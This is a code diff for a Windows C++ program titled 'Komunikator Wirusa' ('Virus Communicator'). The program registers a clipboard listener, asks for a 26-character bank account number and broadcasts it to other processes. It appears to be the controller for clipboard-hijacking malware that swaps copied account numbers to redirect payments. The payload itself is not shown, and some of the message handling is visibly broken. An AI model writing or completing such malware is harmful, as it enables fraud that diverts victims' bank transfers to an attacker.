@@ -1,4 +1,16 @@
-#include "main.h"
+#include <Windows.h>
+#include "resource2.h"
+
+#define REQUEST_NUMBER	0xDEAD
+#define POST_NUMBER		0xBEEF
+#define MAXL			26
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
+bool init(HINSTANCE hInstance);
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
+void MoveToCb();
+void PostNumber();
+INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 
 constexpr CHAR szClassName[] = "KomunikatorWirusa";
 constexpr CHAR windowTitle[] = "Komunikator Wirusa";
@@ -20,6 +32,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	{
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
+
+		if (!bAset)
+			DialogBox(
+				hInstance,
+				MAKEINTRESOURCE(IDD_FORMVIEW),
+				hwndThis,
+				DialogProc
+			);
 	}
 	return 0;
 }
@@ -47,11 +67,11 @@ bool init(HINSTANCE hInstance)
 		NULL,
 		wc.lpszClassName,
 		windowTitle,
-		WS_CAPTION | WS_VISIBLE,
+		WS_TILEDWINDOW | WS_VISIBLE,
 		CW_USEDEFAULT,
 		CW_USEDEFAULT,
-		CW_USEDEFAULT,
-		CW_USEDEFAULT,
+		335,
+		85,
 		NULL,
 		NULL,
 		hInstance,
@@ -63,13 +83,13 @@ bool init(HINSTANCE hInstance)
 	if (!AddClipboardFormatListener(hwndThis)) return false;
 
 	HWND hwndButton = CreateWindow(
-		"BUTTON",  // Predefined class; Unicode assumed 
-		"OK",      // Button text 
-		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles 
+		"BUTTON",	// Predefined class; Unicode assumed 
+		"Enter a new bank account number", // Button text 
+		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, // Styles 
 		10,         // x position 
 		10,         // y position 
-		100,        // Button width
-		100,        // Button height
+		300,        // Button width
+		30,        // Button height
 		hwndThis,   // Parent window
 		NULL,       // No menu.
 		(HINSTANCE)GetWindowLong(hwndThis, GWL_HINSTANCE),
@@ -77,7 +97,6 @@ bool init(HINSTANCE hInstance)
 	);
 
 	messageCode = RegisterWindowMessage(msgName);
-
 
 	bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
 	bAset = false;
@@ -99,6 +118,15 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	}
 	switch (msg)
 	{
+	case WM_COMMAND:
+		switch (wParam)
+		{
+		case BM_CLICK:
+			bAset = false;
+			break;
+		default:
+			break;
+		}
 	case WM_CLOSE:
 		DestroyWindow(hwnd);
 		break;
@@ -121,4 +149,48 @@ void PostNumber()
 		GlobalUnlock(hGlobalMem);
 		PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, LONG_PTR(hGlobalMem));
 	}
+}
+
+INT_PTR CALLBACK DialogProc(HWND hDlg, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+	switch (msg)
+	{
+	case WM_INITDIALOG:
+		SendDlgItemMessage(
+			hDlg,
+			IDC_EDIT1,
+			EM_SETLIMITTEXT,
+			MAXL,
+			NULL
+		);
+		break;
+	case EN_CHANGE:
+		SendDlgItemMessage(
+			hDlg,
+			IDC_BUTTON1,
+			WM_ENABLE,
+			TRUE,
+			NULL
+		);
+		break;
+	case BN_CLICKED:
+		bankAccount[0] = 0;
+		bankAccount[1] = MAXL;
+		SendDlgItemMessage(
+			hDlg,
+			IDC_EDIT1,
+			EM_GETLINE,
+			NULL,
+			LPARAM(bankAccount)
+		);
+		if (strlen(bankAccount) == MAXL)
+		{
+			bAset = true;
+			EndDialog(hDlg, TRUE);
+		}
+		break;
+	default:
+		return DefWindowProc(hDlg, msg, wParam, lParam);
+	}
+	return 0;
 }
